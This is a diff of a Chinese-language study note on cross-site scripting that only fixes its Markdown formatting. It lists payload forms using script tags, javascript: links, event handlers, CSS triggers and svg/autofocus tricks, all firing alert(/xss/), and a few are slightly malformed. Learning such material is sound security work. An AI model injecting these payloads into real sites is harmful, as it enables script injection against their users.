@@ -14,37 +14,37 @@ DOM型XSS：存储区（URL/后端数据库/前端储存）；插入点（前端
 ### XSS平台：在线XSS平台或自己搭建的XSS平台
 ### beef软件
 ### XSS变形：
-** 1.利用<>构造html/JS: **
+**1.利用<>构造html/JS:**
 ```
 <script>alert(/xss/)</script>
 ```
-** 2.伪协议方式构造XSS：** </br>
+**2.伪协议方式构造XSS：** </br>
 ```
 <a href="javascript:alert(/xss/)>touch me</a>
 <a href="javascript:alert(/xss/)>touch me</a>
 ```
-** 3.事件利用：** </br>
+**3.事件利用：** </br>
 ```
 <img src='./smile.jpg' onmouseover='alert(/xss/)'>
 <input type="text" onkeydown="alert(/xss/)">
 <input type="text" onkeyup="alert(/xss/)">
 <input type="button" onclick="alert(/xss/)">
 <img src='#' onerror='alert(/xss/)'>
- ```
-** 4.利用CSS触发XSS（过时）** </br>
+```
+**4.利用CSS触发XSS（过时）** </br>
 行内样式</br>
 ```
 <div style='backgroud-image:url(javascript(/xss/))'>
 ```
 页内样式</br>
-  ```
+```
 <style>=Body{backgroud-image:url(javascript(/xss/))}</style>
 ```
 外部样式</br>
-  ```
+```
 <link rel="stylesheet" type="text/css" href="./xss.css"><div>hello<div>
 ```
-** 5.其他标签以及手法**</br>
+**5.其他标签以及手法**</br>
 ```
 <svg onload="alert(/xss/)"></br>
 <input onfocus=alert(/xss/) autofocus></br>
